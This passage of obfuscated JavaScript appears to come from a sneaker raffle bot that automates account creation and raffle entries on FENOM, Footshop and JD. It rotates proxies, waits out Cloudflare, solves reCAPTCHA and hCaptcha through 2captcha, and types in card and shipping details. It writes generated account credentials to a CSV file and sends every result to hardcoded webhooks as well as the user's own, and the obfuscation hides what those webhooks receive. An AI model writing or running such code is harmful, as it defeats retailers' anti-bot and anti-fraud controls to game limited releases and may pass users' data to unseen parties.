                                await _0x4b7841['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0xe8c827 = 'no', console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Task\x20' + (_0x15315b + 0x1) + '\x20:\x20Account\x20' + _0x38d961[_0x15315b]['Email'] + '\x20Generated')), _0x442555['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x38d961[_0x15315b]['Email'] + ',' + _0x38d961[_0x15315b]['Password']);
                                try {
                                    _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x30de4c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x584f8b(_0x214943, _0x30de4c['succesDEVMSG']);
                            } catch (_0xe16ab0) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0xe16ab0);
                            }
                        } catch (_0x5b1444) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Task\x20' + (_0x15315b + 0x1) + '\x20:\x20' + _0x5b1444)), _0x505a3f = '' + _0x5b1444;
                            var _0x2534c1 = await _0x4d9326(_0x38d961[_0x15315b], _0x198b2b, 'acc', !![], _0x505a3f);
                            _0x30de4c['errorDEV'] = { 'embeds': [_0x2534c1] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x30de4c['errorDEV']), await _0x584f8b(_0x437fba, _0x30de4c['errorDEV']), _0xe8c827 = 'yes';
                        } finally {
                            _0x3577ee['close']();
                            if (_0xe8c827 == 'yes' && _0x3459d1 != 0x5 && _0x505a3f != 'Size\x20Not\x20Found') {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Task\x20' + (_0x15315b + 0x1) + '\x20:\x20Retrying')), _0x15315b = _0x15315b - 0x1, _0x3459d1 = _0x3459d1 + 0x1;
                                continue;
                            }
                            _0xe8c827 == 'yes' && _0x3459d1 >= 0x5 && (_0x1d0bc0(_0x38d961[_0x15315b], _0x198b2b), _0xe8c827 = 'no', _0x3459d1 = 0x0), console['log'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x415f70(_0x1f6328, _0x3326a2, _0x48dc0c) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc60327 = 0x0; _0xc60327 < _0x3326a2['length']; _0xc60327++) {
                        if (_0x419c3d != 'yes')
                            var _0x419c3d = '', _0x33df5c = 0x0;
                        var _0x5886c9;
                        await _0x1713f8(_0x3326a2, _0xc60327), _0x40199d(_0x1f6328['name'] + '\x20Task\x20' + (_0xc60327 + 0x1) + '\x20/\x20' + _0x3326a2['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec);
                        const _0x22b15c = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2ca16a = Math['round'](Math['random']() * (_0x48dc0c['length'] - 0x1)), _0x354496 = _0x48dc0c[_0x2ca16a]['split'](':'), _0x1f3f59;
                        try {
                            _0x1f3f59 = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x354496[0x0] + ':' + _0x354496[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f3f59 = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x354496[0x0] + ':' + _0x354496[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x52c4b5 = await _0x1f3f59['newPage'](), _0x1aa846 = await _0x52c4b5['target']()['createCDPSession'](), { windowId: _0xd12eb3 } = await _0x1aa846['send']('Browser.getWindowForTarget');
                            await _0x52c4b5['authenticate']({
                                'username': '' + _0x354496[0x2],
                                'password': '' + _0x354496[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x52c4b5['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x63444f(0xbb8), await _0x1aa846['send']('Browser.setWindowBounds', {
                                'windowId': _0xd12eb3,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x63444f(0x1f40);
                            try {
                                await _0x52c4b5['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x63444f(0x1388), console['log'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Logging\x20in'), await _0x52c4b5['type']('input[name=\x22email\x22]', '' + _0x3326a2[_0xc60327]['Email']), await _0x63444f(0x1f4), await _0x52c4b5['type']('input[name=\x22password\x22]', '' + _0x3326a2[_0xc60327]['Password']), await _0x63444f(0x258), await _0x52c4b5['$eval']('#login-form', _0x27687e => _0x27687e['submit']()), await _0x52c4b5['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x63444f(0x1f4), await _0x52c4b5['goto']('' + _0x3326a2[_0xc60327]['Url']), await _0x52c4b5['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3326a2[_0xc60327]['Size']);
                            if (_0x3326a2[_0xc60327]['Size'] != 'RANDOM') {
                                var _0x5cbfe6 = '\x20' + _0x3326a2[_0xc60327]['Size'] + '\x20';
                                const _0x3c2152 = await _0x52c4b5['$x']('//span[contains(text(),\x20' + _0x5cbfe6 + ')]');
                                await _0x3c2152[0x0]['click']();
                            } else {
                                const _0x35bc97 = await _0x52c4b5['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x16a718 = Math['round'](Math['random']() * (_0x35bc97['length'] - 0x1));
                                await _0x35bc97[_0x16a718]['click']();
                            }
                            await _0x63444f(0x258), await _0x52c4b5['click']('#cookieChoiceDismiss'), await _0x63444f(0x3e8), await _0x52c4b5['type']('#instagram-account', '' + _0x3326a2[_0xc60327]['Follower']), await _0x63444f(0x28a), await _0x52c4b5['click']('#book-btn'), await _0x63444f(0xbb8), await _0x52c4b5['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x63444f(0x1f4), console['log'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20' + _0x580fd6['cyan']('Solving\x20Captcha')), await _0x52c4b5['solveRecaptchas'](), console['log'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x63444f(0x7d0), await _0x52c4b5['$eval']('#book-btn-for-sure', _0x2a870f => _0x2a870f['click']()), await _0x63444f(0x12c), await _0x52c4b5['click']('#book-btn-for-sure'), await _0x63444f(0xdac);
                            const _0x1aeb14 = await _0x52c4b5['$eval']('.reservation-popup\x20>\x20.title', _0x41ca36 => {
                                return _0x41ca36['innerHTML'];
                            });
                            if (_0x1aeb14) {
                                _0x419c3d = 'no', _0xa2d2c6(_0x3326a2[_0xc60327], _0x1f6328), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x41f439 = await _0x4d9326(_0x3326a2[_0xc60327], _0x1f6328, 'dev', ![]), _0x2619d4 = await _0x4d9326(_0x3326a2[_0xc60327], _0x1f6328, 'pub', ![]);
                                const _0x115dbc = {
                                    'succesDEVMSG': { 'embeds': [_0x41f439] },
                                    'succesPUBMSG': { 'embeds': [_0x2619d4] }
                                };
                                try {
                                    _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x115dbc['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x115dbc['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0x3501b6, _0x115dbc['succesPUBMSG']);
                                } catch (_0xf1b74) {
                                    console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf1b74));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x4351d3) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20' + _0x4351d3)), _0x5886c9 = '' + _0x4351d3;
                            var _0xfae167 = await _0x4d9326(_0x3326a2[_0xc60327], _0x1f6328, 'dev', !![], _0x5886c9), _0x41f439 = await _0x4d9326(_0x3326a2[_0xc60327], _0x1f6328, 'dev', ![]), _0x2619d4 = await _0x4d9326(_0x3326a2[_0xc60327], _0x1f6328, 'pub', ![]);
                            const _0x257732 = {
                                'succesDEVMSG': { 'embeds': [_0x41f439] },
                                'succesPUBMSG': { 'embeds': [_0x2619d4] }
                            };
                            _0x257732['errorDEV'] = { 'embeds': [_0xfae167] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x257732['errorDEV']), await _0x584f8b(_0x437fba, _0x257732['errorDEV']), _0x4351d3 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x419c3d = 'yes');
                        } finally {
                            _0x1f3f59['close']();
                            if (_0x419c3d == 'yes' && _0x33df5c != 0x5 && _0x5886c9 != 'Size\x20Not\x20Found') {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Task\x20' + (_0xc60327 + 0x1) + '\x20:\x20Retrying')), _0xc60327 = _0xc60327 - 0x1, _0x33df5c = _0x33df5c + 0x1;
                                continue;
                            }
                            _0x419c3d == 'yes' && _0x33df5c >= 0x5 && (_0x1d0bc0(_0x3326a2[_0xc60327], _0x1f6328), _0x419c3d = 'no', _0x33df5c = 0x0), console['log'](_0x46d913() + '\x20[' + _0x1f6328['name'] + ']\x20Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x3277bb, _0x35196b, _0x3adb01) {
                _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0xb4964b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x36a09b = 0x0; _0x36a09b < _0x35196b['length']; _0x36a09b++) {
                    var _0x2179bb;
                    if (_0x337927 != 'yes')
                        var _0x337927 = '', _0x5ece54 = 0x0;
                    var _0x1046ae = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x1a887b
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x35196b[_0x36a09b]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x35196b[_0x36a09b]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0xb4964b['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3b25e6
                            }
                        ]
                    }], _0x3d2ddf = await _0x4d9326(_0x35196b[_0x36a09b], _0x3277bb, 'dev', ![]), _0x16a56e = await _0x4d9326(_0x35196b[_0x36a09b], _0x3277bb, 'pub', ![]);
                    const _0x44e81d = {
                        'succesDEVMSG': { 'embeds': [_0x3d2ddf] },
                        'succesPUBMSG': { 'embeds': [_0x16a56e] }
                    }, _0x59b03c = { 'embeds': _0x1046ae };
                    await _0x1713f8(_0x35196b, _0x36a09b);
                    if (_0x35196b[_0x36a09b]['Email'] == '' || _0x35196b[_0x36a09b]['FirstName'] == '' || _0x35196b[_0x36a09b]['LastName'] == '' || _0x35196b[_0x36a09b]['Country'] == '' || _0x35196b[_0x36a09b]['Size'] == '' || _0x35196b[_0x36a09b]['Address1'] == '' || _0x35196b[_0x36a09b]['Zip'] == '') {
                        console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x35196b[_0x36a09b]['Email'] == '' || _0x35196b[_0x36a09b]['FirstName'] == '' || _0x35196b[_0x36a09b]['LastName'] == '' || _0x35196b[_0x36a09b]['Country'] == '' || _0x35196b[_0x36a09b]['Size'] == '' || _0x35196b[_0x36a09b]['Address1'] == '' || _0x35196b[_0x36a09b]['Zip'] == '' || _0x35196b[_0x36a09b]['Phone'] == '') {
                        console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x567be = '' + _0x35196b[_0x36a09b]['Url'];
                    if (_0xb4964b['useRandomProxy'] = ![])
                        var _0x933b86 = _0x3adb01[_0x36a09b]['split'](':');
                    else
                        var _0x2f24ce = Math['round'](Math['random']() * (_0x3adb01['length'] - 0x1)), _0x933b86 = _0x3adb01[_0x2f24ce]['split'](':');
                    const _0x39f86e = await _0x5e99b4['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x933b86[0x0] + ':' + _0x933b86[0x1]]
                    });
                    try {
                        const _0x4480b4 = await _0x39f86e['newPage']();
                        await _0x4480b4['authenticate']({
                            'username': '' + _0x933b86[0x2],
                            'password': '' + _0x933b86[0x3]
                        }), console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4480b4['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4480b4['setRequestInterception'](!![]), _0x4480b4['on']('request', _0x23aa05 => {
                            _0x23aa05['resourceType']() === 'image' || _0x23aa05['resourceType']() === 'font' || _0x23aa05['resourceType']() === 'media' ? _0x23aa05['abort']() : _0x23aa05['continue']();
                        }), await _0x4480b4['goto'](_0x567be), await _0x63444f(0xbb8), await _0x4480b4['waitForSelector']('.control__JhutY'), await _0x4480b4['click']('.control__JhutY'), await _0x63444f(0x1f4);
                        if (_0x35196b[_0x36a09b]['Size'] != 'RANDOM')
                            try {
                                const _0x112270 = await _0x4480b4['$x']('//div[contains(text(),\x20\x27' + _0x35196b[_0x36a09b]['Size'] + '\x27)]');
                                await _0x112270[0x0]['click']();
                            } catch {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x353b57 = await _0x4480b4['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x85b576 = Math['round'](Math['random']() * (_0x353b57['length'] - 0x1));
                            await _0x353b57[_0x85b576]['click']();
                        }
                        await _0x63444f(0x4b0);
                        const _0x20e23c = await _0x4480b4['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x20e23c[0x0]['click'](), await _0x4480b4['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x4480b4['type']('input[name=\x22email\x22]', '' + _0x35196b[_0x36a09b]['Email']), await _0x63444f(0x640), await _0x4480b4['type']('input[name=\x22phone\x22]', '' + _0x35196b[_0x36a09b]['Phone']), await _0x63444f(0x4b0), await _0x4480b4['click']('button.btn.continue-button__1RtsS'), await _0x63444f(0x4b0);
                        try {
                            await _0x4480b4['type']('input[name=\x22firstName\x22]', '' + _0x35196b[_0x36a09b]['FirstName']), await _0x63444f(0x258);
                        } catch {
                            const _0x1d4a3c = await _0x4480b4['$$eval']('.invalid-feedback\x20>\x20div', _0x31a3cf => {
                                return _0x31a3cf['map'](_0x3cbc70 => _0x3cbc70['innerText']);
                            });
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20' + _0x1d4a3c));
                            continue;
                        }
                        await _0x4480b4['type']('input[name=\x22lastName\x22]', '' + _0x35196b[_0x36a09b]['LastName']), await _0x63444f(0xc8), await _0x4480b4['type']('input[name=\x22instagramUsername\x22]', '' + _0x35196b[_0x36a09b]['Follower']), await _0x63444f(0x4b0), await _0x4480b4['click']('button.btn.continue-button__1RtsS'), await _0x63444f(0x3e8), console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x4480b4['select']('select[name=\x22country\x22]', '' + _0x35196b[_0x36a09b]['Country']), await _0x63444f(0x2bc), await _0x4480b4['type']('input[name=\x22streetName\x22]', '' + _0x35196b[_0x36a09b]['Address1']), await _0x63444f(0x258), await _0x4480b4['type']('input[name=\x22houseNumber\x22]', _0x35196b[_0x36a09b]['HouseNumber'] + '\x20' + _0x35196b[_0x36a09b]['Address2']), await _0x63444f(0xc8), await _0x4480b4['type']('input[name=\x22postalCode\x22]', '' + _0x35196b[_0x36a09b]['Zip']), await _0x63444f(0x1f4), await _0x4480b4['type']('input[name=\x22city\x22]', '' + _0x35196b[_0x36a09b]['City']), await _0x63444f(0x4b0), await _0x4480b4['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x63444f(0x4b0), await _0x4480b4['click']('button.btn.continue-button__1RtsS'), await _0x63444f(0x4b0), console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x4480b4['solveRecaptchas'](), console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x63444f(0xbb8), await _0x4480b4['click']('button.btn.continue-button__1RtsS'), await _0x63444f(0x1388), console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4480b4['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4480b4['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x63444f(0x4b0), await _0x4480b4['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x35196b[_0x36a09b]['CardNumber']), await _0x63444f(0x320), await _0x4480b4['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4480b4['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x35196b[_0x36a09b]['ExpiryDate']), await _0x63444f(0x4b0), await _0x4480b4['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4480b4['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x35196b[_0x36a09b]['CVV']), await _0x63444f(0x226), await _0x4480b4['type']('input[name=\x22holderName\x22]', '' + _0x35196b[_0x36a09b]['NameOnCard']), await _0x63444f(0x226), await _0x4480b4['click']('button.adyen-checkout__button'), console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x4480b4['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x63444f(0xbb8);
                        } catch (_0x2bfb11) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x203DS\x20Failed')), _0x2179bb = '3DS\x20Error\x20' + _0x2bfb11;
                            var _0x2af814 = await _0x4d9326(_0x35196b[_0x36a09b], _0x3277bb, 'dev', !![], _0x2179bb);
                            _0x44e81d['errorDEV'] = { 'embeds': [_0x2af814] };
                            _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x44e81d['errorDEV']);
                            await _0x584f8b(_0x437fba, _0x44e81d['errorDEV']);
                            continue;
                        }
                        _0xa2d2c6(_0x35196b[_0x36a09b], _0x3277bb), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                            try {
                                await _0x584f8b(_0xb4964b['webhook'], _0x44e81d['succesDEVMSG']);
                            } catch {
                            }
                        await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x44e81d['succesDEVMSG']), await _0x63444f(0xc8);
                        try {
                            await _0x584f8b(_0x3501b6, _0x44e81d['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x2eca2e) {
                        console['log'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20' + _0x2eca2e), _0x2179bb = '' + _0x2eca2e;
                        var _0x2af814 = await _0x4d9326(_0x35196b[_0x36a09b], _0x3277bb, 'dev', !![], _0x2179bb);
                        _0x44e81d['errorDEV'] = { 'embeds': [_0x2af814] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x44e81d['errorDEV']), await _0x584f8b(_0x437fba, _0x44e81d['errorDEV']), _0x337927 = 'yes';
                    } finally {
                        _0x39f86e['close']();
                        if (_0x337927 == 'yes' && _0x5ece54 != 0x5) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x3277bb['name'] + ']\x20Task\x20' + (_0x36a09b + 0x1) + '\x20:\x20Retrying')), _0x36a09b = _0x36a09b - 0x1, _0x5ece54 = _0x5ece54 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0xb4964b['footshopDelay'] + '\x20ms'), await _0x63444f(_0xb4964b['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x48f539, _0x3db933, _0x216081) {
                var _0x2818ac = ![], _0x3d140c = ![];
                if (_0xb4964b['captchaKey'] == '' || _0xb4964b['captchaKey'] == undefined)
                    return console['log'](_0x580fd6['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0xb4964b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x29828d = 0x0; _0x29828d < _0x3db933['length']; _0x29828d++) {
                    if (_0x3e1c85 != 'yes')
                        var _0x3e1c85 = '', _0x308bb6 = 0x0;
                    var _0x4cc957, _0x4c8c24 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x3db933[_0x29828d]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3db933[_0x29828d]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x1a887b
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0xb4964b['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3b25e6
                            }
                        ]
                    }];
                    const _0x55e729 = { 'embeds': _0x4c8c24 };
                    _0x40199d(_0x48f539['name'] + '\x20Task\x20' + (_0x29828d + 0x1) + '\x20/\x20' + _0x3db933['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x3db933, _0x29828d);
                    var _0x36c8e6 = await _0x4d9326(_0x3db933[_0x29828d], _0x48f539, 'dev', ![]), _0x938512 = await _0x4d9326(_0x3db933[_0x29828d], _0x48f539, 'pub', ![]);
                    const _0xce8de8 = {
                        'succesDEVMSG': { 'embeds': [_0x36c8e6] },
                        'succesPUBMSG': { 'embeds': [_0x938512] }
                    };
                    if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                        try {
                            await _0x584f8b(_0xb4964b['webhook'], _0xce8de8['succesDEVMSG']);
                        } catch {
                        }
                    await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0xce8de8['succesDEVMSG']), await _0x63444f(0xc8);
                    try {
                        await _0x584f8b(_0x3501b6, _0xce8de8['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x3db933[_0x29828d]['Email'] == '' || _0x3db933[_0x29828d]['Url'] == '' || _0x3db933[_0x29828d]['FirstName'] == '' || _0x3db933[_0x29828d]['LastName'] == '') {
                        console['log'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0xb4964b['useRandomProxy'] = ![])
                        var _0x2f7f7f = _0x216081[_0x29828d]['split'](':');
                    else
                        var _0x1b868e = Math['round'](Math['random']() * (_0x216081['length'] - 0x1)), _0x2f7f7f = _0x216081[_0x1b868e]['split'](':');
                    const _0x4dc800 = await _0x5e99b4['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x2f7f7f[0x0] + ':' + _0x2f7f7f[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x47cb41 = await _0x4dc800['newPage']();
                        await _0x47cb41['authenticate']({
                            'username': '' + _0x2f7f7f[0x2],
                            'password': '' + _0x2f7f7f[0x3]
                        }), console['log'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x47cb41['setRequestInterception'](!![]), _0x47cb41['on']('request', _0x2c769c => {
                            _0x2c769c['resourceType']() === 'image' || _0x2c769c['resourceType']() === 'font' || _0x2c769c['resourceType']() === 'media' ? _0x2c769c['abort']() : _0x2c769c['continue']();
                        }), await _0x47cb41['goto']('' + _0x3db933[_0x29828d]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x47cb41['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20Filling\x20Information'), await _0x47cb41['type']('#comp_firstname', '' + _0x3db933[_0x29828d]['FirstName']), await _0x47cb41['waitForSelector']('#comp_lastname'), await _0x47cb41['type']('#comp_lastname', '' + _0x3db933[_0x29828d]['LastName']), await _0x47cb41['waitForSelector']('#comp_email'), await _0x47cb41['type']('#comp_email', '' + _0x3db933[_0x29828d]['Email']), await _0x47cb41['waitForSelector']('#comp_paypalemail'), await _0x47cb41['type']('#comp_paypalemail', '' + _0x3db933[_0x29828d]['Email']), await _0x47cb41['waitForSelector']('#comp_mobile_end'), await _0x47cb41['type']('#comp_mobile_end', '' + _0x3db933[_0x29828d]['Phone']), await _0x47cb41['waitForSelector']('#comp_dob'), await _0x47cb41['type']('#comp_dob', '08/09/1992'), console['log'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x3db933[_0x29828d]['Size'] == 'RANDOM') {
                            const _0x3be672 = await _0x47cb41['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4c113e => {
                                return _0x4c113e['map'](_0x163a36 => _0x163a36['value']);
                            });
